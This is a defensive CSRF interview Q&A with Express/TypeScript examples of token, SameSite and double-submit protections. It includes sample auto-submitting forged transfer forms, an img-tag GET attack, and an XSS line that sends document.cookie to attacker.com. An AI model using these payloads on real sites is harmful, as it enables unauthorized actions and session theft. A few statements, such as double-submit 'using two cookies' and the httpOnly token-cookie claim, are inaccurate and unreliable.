# CSRF (Cross-Site Request Forgery) Interview Questions

## CSRF Fundamentals

### Q1: What is CSRF (Cross-Site Request Forgery)?

**Answer:**

CSRF is an attack that forces authenticated users to perform unwanted actions on a web application where they're currently authenticated. The attack exploits the trust a website has in the user's browser.

**How it works:**
1. User is logged into `bank.com`
2. User visits malicious site `evil.com`
3. `evil.com` contains a form that submits to `bank.com`
4. Browser automatically sends user's cookies to `bank.com`
5. `bank.com` sees authenticated request and processes it
6. Unwanted action is performed (e.g., money transfer)

**Example Attack:**
```html
<!-- On evil.com -->
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker-account">
  <input type="hidden" name="amount" value="1000">
  <input type="submit" value="Click for free money!">
</form>

<script>
  // Auto-submit form
  document.forms[0].submit();
</script>
```

---

### Q2: How do you prevent CSRF attacks?

**Answer:**

**1. CSRF Tokens (Most Common):**
```typescript
import csrf from 'csurf';
import cookieParser from 'cookie-parser';

app.use(cookieParser());
app.use(csrf({ cookie: true }));

// Get token
app.get('/api/csrf-token', (req, res) => {
  res.json({ csrfToken: req.csrfToken() });
});

// Protected route
app.post('/api/transfer', (req, res) => {
  // Token validated automatically by csurf middleware
  // Process transfer
});
```

**2. SameSite Cookies:**
```typescript
app.use(session({
  cookie: {
    sameSite: 'strict', // or 'lax'
    secure: true, // HTTPS only
    httpOnly: true
  }
}));
```

**3. Double Submit Cookie:**
```typescript
// Set cookie with random value
app.use((req, res, next) => {
  if (!req.cookies.csrf) {
    const token = crypto.randomBytes(32).toString('hex');
    res.cookie('csrf', token, { 
      httpOnly: false, // Must be readable by JavaScript
      sameSite: 'strict'
    });
  }
  next();
});

// Validate token matches cookie
app.post('/api/transfer', (req, res) => {
  const token = req.headers['x-csrf-token'];
  if (token !== req.cookies.csrf) {
    return res.status(403).json({ error: 'Invalid CSRF token' });
  }
  // Process request
});
```

**4. Custom Headers:**
```typescript
// Require custom header (can't be set by browser from another origin)
app.post('/api/transfer', (req, res) => {
  if (!req.headers['x-requested-with']) {
    return res.status(403).json({ error: 'Missing custom header' });
  }
  // Process request
});
```

---

### Q3: What is the difference between SameSite 'strict' and 'lax'?

**Answer:**

**SameSite='strict':**
- Cookie is NEVER sent in cross-site requests
- Most secure
- May break some legitimate use cases (e.g., clicking link from email)

```typescript
// User clicks link from email → cookie NOT sent
// User submits form from another site → cookie NOT sent
```

**SameSite='lax' (Default in modern browsers):**
- Cookie is sent for top-level navigation (GET requests)
- Cookie is NOT sent for POST requests from other sites
- Good balance of security and usability

```typescript
// User clicks link from email → cookie IS sent (GET request)
// User submits form from another site → cookie NOT sent (POST request)
```

**SameSite='none':**
- Cookie is always sent (even cross-site)
- Requires `Secure` flag
- Least secure, only use when necessary

**Example:**
```typescript
app.use(session({
  cookie: {
    sameSite: 'lax', // Good default
    secure: process.env.NODE_ENV === 'production',
    httpOnly: true
  }
}));
```

---

### Q4: How do CSRF tokens work?

**Answer:**

CSRF tokens are random, unpredictable values that are:
1. Generated by the server
2. Sent to the client (in form/cookie)
3. Required in subsequent requests
4. Validated by the server

**Flow:**
```typescript
// 1. Server generates token
app.get('/form', (req, res) => {
  const token = req.csrfToken();
  res.render('form', { csrfToken: token });
});

// 2. Client includes token in form
// <form method="POST">
//   <input type="hidden" name="_csrf" value="<%= csrfToken %>">
// </form>

// 3. Server validates token
app.post('/form', csrfProtection, (req, res) => {
  // Token automatically validated by middleware
  // If invalid, 403 error is returned
});
```

**Why it works:**
- Attacker can't read the token (Same-Origin Policy)
- Attacker can't guess the token (cryptographically random)
- Token must match between cookie and form/header

**Token Storage:**
```typescript
// Option 1: In session (server-side)
req.session.csrfToken = generateToken();

// Option 2: In cookie (double submit)
res.cookie('csrf', token);

// Option 3: In form/header (sent with request)
// Token in hidden form field or custom header
```

---

### Q5: What is the Double Submit Cookie pattern?

**Answer:**

Double Submit Cookie is a CSRF protection method that uses two cookies:
1. A cookie set by the server
2. The same value sent in the request (form field or header)

**How it works:**
```typescript
// 1. Set cookie with random value
app.use((req, res, next) => {
  if (!req.cookies.csrf) {
    const token = crypto.randomBytes(32).toString('hex');
    res.cookie('csrf', token, {
      httpOnly: false, // Must be readable by JavaScript
      sameSite: 'strict',
      secure: true
    });
  }
  next();
});

// 2. Client reads cookie and sends in request
// JavaScript:
const token = document.cookie.split('; ')
  .find(row => row.startsWith('csrf='))
  .split('=')[1];

fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'X-CSRF-Token': token
  },
  body: JSON.stringify({ to: 'account', amount: 100 })
});

// 3. Server validates token matches cookie
app.post('/api/transfer', (req, res) => {
  const token = req.headers['x-csrf-token'];
  const cookieToken = req.cookies.csrf;
  
  if (!token || token !== cookieToken) {
    return res.status(403).json({ error: 'Invalid CSRF token' });
  }
  
  // Process request
});
```

**Advantages:**
- No server-side storage needed
- Stateless
- Works with REST APIs

**Disadvantages:**
- Requires JavaScript (can't use with pure HTML forms)
- Cookie must be readable by JavaScript (not httpOnly)

---

### Q6: Can CSRF tokens be used with APIs?

**Answer:**

Yes, but implementation differs from traditional forms:

**Option 1: Token in Header**
```typescript
// Get token
app.get('/api/csrf-token', (req, res) => {
  res.json({ csrfToken: req.csrfToken() });
});

// Use token in API request
fetch('/api/users', {
  method: 'POST',
  headers: {
    'X-CSRF-Token': csrfToken,
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({ name: 'John' })
});

// Validate token
app.post('/api/users', csrfProtection, (req, res) => {
  // Token validated automatically
});
```

**Option 2: Double Submit Cookie**
```typescript
// Cookie set automatically
// Client reads cookie and sends in header
const token = getCookie('csrf');

fetch('/api/users', {
  method: 'POST',
  headers: {
    'X-CSRF-Token': token
  }
});
```

**Option 3: Custom Header (Simpler)**
```typescript
// Require custom header (browsers block cross-origin custom headers)
app.post('/api/users', (req, res) => {
  if (!req.headers['x-requested-with']) {
    return res.status(403).json({ error: 'Missing header' });
  }
  // Process request
});
```

---

### Q7: How do you handle CSRF protection for stateless APIs (JWT)?

**Answer:**

For stateless APIs using JWT, CSRF protection is different:

**Option 1: Store JWT in httpOnly Cookie (Recommended)**
```typescript
// Login - set JWT in httpOnly cookie
app.post('/api/login', async (req, res) => {
  const token = jwt.sign({ userId: user.id }, secret);
  res.cookie('token', token, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict'
  });
  res.json({ success: true });
});

// Use CSRF token for state-changing operations
app.post('/api/transfer', csrfProtection, (req, res) => {
  // CSRF token required
});
```

**Option 2: JWT in Authorization Header (No CSRF needed)**
```typescript
// JWT in header (not cookie) = no CSRF risk
// But requires client to manage token storage

app.post('/api/transfer', authenticateJWT, (req, res) => {
  // No CSRF protection needed
  // Attacker can't set Authorization header from another origin
});
```

**Option 3: Double Submit Cookie with JWT**
```typescript
// Set CSRF cookie
app.use((req, res, next) => {
  if (!req.cookies.csrf) {
    const token = crypto.randomBytes(32).toString('hex');
    res.cookie('csrf', token, { httpOnly: false, sameSite: 'strict' });
  }
  next();
});

// Validate CSRF token matches cookie
app.post('/api/transfer', authenticateJWT, (req, res) => {
  const token = req.headers['x-csrf-token'];
  if (token !== req.cookies.csrf) {
    return res.status(403).json({ error: 'Invalid CSRF token' });
  }
  // Process request
});
```

**Key Point:** If JWT is in httpOnly cookie, you need CSRF protection. If JWT is in Authorization header, CSRF is not needed (but XSS can still steal it).

---

### Q8: What is the difference between CSRF and XSS?

**Answer:**

| Aspect | CSRF | XSS |
|--------|------|-----|
| **Attack Vector** | Cross-site request | Injected script |
| **Requires** | User to be authenticated | Vulnerable input/output |
| **Goal** | Perform actions as user | Steal data/execute code |
| **Prevention** | CSRF tokens, SameSite cookies | Input validation, output encoding |
| **Impact** | Unauthorized actions | Data theft, session hijacking |

**CSRF Example:**
```html
<!-- Attacker tricks user into making request -->
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker">
</form>
```

**XSS Example:**
```javascript
// Attacker injects script
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>
```

**Combined Attack:**
- XSS can be used to steal CSRF tokens
- XSS can be used to perform CSRF attacks
- Both need to be prevented

---

### Q9: How do you test for CSRF vulnerabilities?

**Answer:**

**1. Manual Testing:**
```html
<!-- Create HTML file on different origin -->
<form id="csrf" action="https://target.com/api/transfer" method="POST">
  <input type="hidden" name="to" value="attacker-account">
  <input type="hidden" name="amount" value="1000">
</form>
<script>document.getElementById('csrf').submit();</script>
```

**2. Check for CSRF Protection:**
- Look for CSRF tokens in forms
- Check for SameSite cookie attribute
- Verify custom headers are required
- Test if requests work without token

**3. Automated Tools:**
- OWASP ZAP
- Burp Suite
- CSRF Tester browser extension

**4. Code Review:**
```typescript
// Look for:
- Missing CSRF protection on state-changing operations
- GET requests that modify state
- Missing SameSite on session cookies
- APIs without CSRF tokens
```

---

### Q10: Can GET requests be vulnerable to CSRF?

**Answer:**

**Yes, but less common:**

**Vulnerable GET Request:**
```typescript
// ❌ Bad: GET request that modifies state
app.get('/api/delete-user/:id', (req, res) => {
  await deleteUser(req.params.id);
  res.json({ success: true });
});

// Attacker can use:
// <img src="https://site.com/api/delete-user/123">
```

**Why GET requests are less vulnerable:**
- Browsers may pre-fetch GET requests
- GET requests shouldn't modify state (REST principle)
- SameSite cookies still protect GET requests

**Best Practice:**
```typescript
// ✅ Good: Use POST for state-changing operations
app.post('/api/delete-user/:id', csrfProtection, (req, res) => {
  await deleteUser(req.params.id);
  res.json({ success: true });
});
```

**REST Principles:**
- GET: Read-only (idempotent, safe)
- POST: Create/modify (not idempotent)
- PUT: Update (idempotent)
- DELETE: Delete (idempotent)

All state-changing operations should use POST/PUT/DELETE with CSRF protection.

---

### Q11: How do you implement CSRF protection in a SPA (Single Page Application)?

**Answer:**

**Option 1: Token in API Response**
```typescript
// Backend: Provide token endpoint
app.get('/api/csrf-token', (req, res) => {
  res.json({ csrfToken: req.csrfToken() });
});

// Frontend: Fetch and store token
const response = await fetch('/api/csrf-token');
const { csrfToken } = await response.json();
localStorage.setItem('csrfToken', csrfToken);

// Include in all requests
fetch('/api/users', {
  method: 'POST',
  headers: {
    'X-CSRF-Token': localStorage.getItem('csrfToken')
  }
});
```

**Option 2: Double Submit Cookie**
```typescript
// Backend: Set cookie
app.use((req, res, next) => {
  if (!req.cookies.csrf) {
    const token = crypto.randomBytes(32).toString('hex');
    res.cookie('csrf', token, { httpOnly: false, sameSite: 'strict' });
  }
  next();
});

// Frontend: Read cookie and send in header
function getCookie(name: string): string | null {
  const value = `; ${document.cookie}`;
  const parts = value.split(`; ${name}=`);
  if (parts.length === 2) return parts.pop()?.split(';').shift() || null;
  return null;
}

const token = getCookie('csrf');
fetch('/api/users', {
  method: 'POST',
  headers: {
    'X-CSRF-Token': token
  }
});
```

**Option 3: Custom Header (Simplest)**
```typescript
// Backend: Require custom header
app.post('/api/users', (req, res) => {
  if (!req.headers['x-requested-with']) {
    return res.status(403).json({ error: 'Missing header' });
  }
  // Process
});

// Frontend: Always include header
fetch('/api/users', {
  method: 'POST',
  headers: {
    'X-Requested-With': 'XMLHttpRequest'
  }
});
```

---

### Q12: What are the limitations of CSRF protection?

**Answer:**

**1. XSS Can Bypass CSRF Protection:**
```javascript
// If XSS exists, attacker can read CSRF token
const token = document.querySelector('[name="_csrf"]').value;
fetch('/api/transfer', {
  method: 'POST',
  headers: { 'X-CSRF-Token': token }
});
```

**2. Subdomain Attacks:**
```typescript
// If cookie is set for parent domain
// Subdomain can access it
// example.com sets cookie for .example.com
// evil.example.com can access cookie
```

**3. Token Storage:**
- If token stored in localStorage → vulnerable to XSS
- If token in cookie → must be httpOnly for security
- If token in DOM → vulnerable to XSS

**4. Stateless APIs:**
- JWT in header doesn't need CSRF protection
- But still vulnerable to XSS token theft

**5. Mobile Apps:**
- Mobile apps don't have same-origin policy
- Need different protection mechanisms

**Best Practice:** Use defense in depth:
- CSRF tokens
- SameSite cookies
- Input validation
- XSS prevention
- Rate limiting

---

### Q13: How do you handle CSRF tokens with file uploads?

**Answer:**

**Option 1: Token in Form Data**
```typescript
// HTML form
<form enctype="multipart/form-data" method="POST">
  <input type="hidden" name="_csrf" value="<%= csrfToken %>">
  <input type="file" name="file">
  <button type="submit">Upload</button>
</form>

// Backend
app.post('/api/upload', 
  csrfProtection,
  upload.single('file'),
  (req, res) => {
    // File uploaded
  }
);
```

**Option 2: Token in Header (for AJAX)**
```typescript
// Frontend
const formData = new FormData();
formData.append('file', fileInput.files[0]);

fetch('/api/upload', {
  method: 'POST',
  headers: {
    'X-CSRF-Token': csrfToken
  },
  body: formData
});

// Backend
app.post('/api/upload',
  csrf({ cookie: true }),
  upload.single('file'),
  (req, res) => {
    // File uploaded
  }
);
```

**Note:** Some CSRF libraries may have issues with multipart/form-data. Test thoroughly.

---

### Q14: What is the origin of CSRF attacks?

**Answer:**

CSRF attacks exploit the browser's same-origin policy behavior:

**Same-Origin Policy:**
- Prevents JavaScript from reading responses from other origins
- BUT allows sending requests to other origins
- Cookies are automatically sent with requests

**The Problem:**
```typescript
// User is logged into bank.com
// bank.com sets session cookie

// User visits evil.com
// evil.com makes request to bank.com
// Browser automatically includes bank.com cookies
// bank.com sees authenticated request
// Attack succeeds
```

**Why it works:**
1. Cookies are sent automatically (can't be prevented by JavaScript)
2. Requests can be made cross-origin (forms, images, etc.)
3. Server can't distinguish legitimate vs. malicious requests

**Solution:**
- CSRF tokens: Attacker can't read token (Same-Origin Policy)
- SameSite cookies: Browser doesn't send cookie cross-site
- Custom headers: Browser blocks cross-origin custom headers

---

### Q15: How do you implement CSRF protection in Express.js?

**Answer:**

**Using csurf library:**
```typescript
import express from 'express';
import csrf from 'csurf';
import cookieParser from 'cookie-parser';
import session from 'express-session';

const app = express();

// Required middleware
app.use(cookieParser());
app.use(session({
  secret: 'your-secret-key',
  cookie: { sameSite: 'strict' }
}));

// CSRF protection
const csrfProtection = csrf({ cookie: true });

// Get CSRF token
app.get('/api/csrf-token', csrfProtection, (req, res) => {
  res.json({ csrfToken: req.csrfToken() });
});

// Protected routes
app.post('/api/transfer', csrfProtection, (req, res) => {
  // Token automatically validated
  // If invalid, 403 Forbidden is returned
  res.json({ success: true });
});

// Error handling
app.use((err, req, res, next) => {
  if (err.code === 'EBADCSRFTOKEN') {
    res.status(403).json({ error: 'Invalid CSRF token' });
  } else {
    next(err);
  }
});
```

**Manual Implementation:**
```typescript
import crypto from 'crypto';

// Generate token
function generateToken(): string {
  return crypto.randomBytes(32).toString('hex');
}

// Store in session
app.get('/form', (req, res) => {
  req.session.csrfToken = generateToken();
  res.render('form', { csrfToken: req.session.csrfToken });
});

// Validate token
app.post('/form', (req, res) => {
  const token = req.body._csrf || req.headers['x-csrf-token'];
  
  if (!token || token !== req.session.csrfToken) {
    return res.status(403).json({ error: 'Invalid CSRF token' });
  }
  
  // Delete token after use (optional)
  delete req.session.csrfToken;
  
  // Process request
  res.json({ success: true });
});
```

